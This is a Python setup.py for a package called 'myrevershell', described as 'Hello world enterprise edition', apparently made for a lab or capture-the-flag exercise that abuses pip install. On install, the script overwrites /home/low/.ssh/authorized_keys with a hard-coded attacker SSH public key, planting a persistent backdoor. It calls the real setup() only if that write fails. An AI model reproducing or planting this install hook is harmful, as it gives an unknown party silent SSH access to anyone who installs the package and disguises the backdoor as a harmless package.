from setuptools import setup
try:
        print ('hello')
        with open ('/home/low/.ssh/authorized_keys','w+') as f :
                f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuq6l/FWILJsmYisEPAI3bKHw0R8tsEn189v+vkeuoMpaRXgL+h/VoybVzH4yOCrVqWhHPQrkGwrwrN5a2jbpy3zm3Ad8wsjJxVr/HZS5lQVYqSAp/F1Xde4BwhSLDzBASKhdVIy26IOOM6Je+m6Njw4uDuWujtK5aZdfkcPdkJY6uQEM+kMmaJREXGhv1+WnHE6Ewpuh0g/zguF6H990N2x4/4Aw+oh6U637KLHusodNTNqXnZBN7g8skRkVqfVWB9cXfyl39lYvqlsUAqRjZmIpn+0SQ3IFiEWpnJ4/ZhPsmTpJIomceskZPZa27KpE8EnAA6CYvThAf+kwFpfqqLLxfH6i602mUsaEML9NlxVAaREy7qe02WnDnDtZ5YpU+w964OmU5Y1now6QkPifBo9x2e/OzdsMae+tIqB1QcplUPYAdq8NaarxW7Glpdwk2lsLXtRYevynmTE35YMNqdJY0JmgJuUoZ8jCQf/FE1UAIbKuBgrU42QbKpSTsN/U=')
except:

    setup(
        name='myrevershell',
        packages=['myrevershell'],
        description='Hello world enterprise edition',
        version='0.1',
        url='http://test.com',
        author='Malang',
        author_email='test@test.com',
        keyword=['pip','revershell','example']
        )
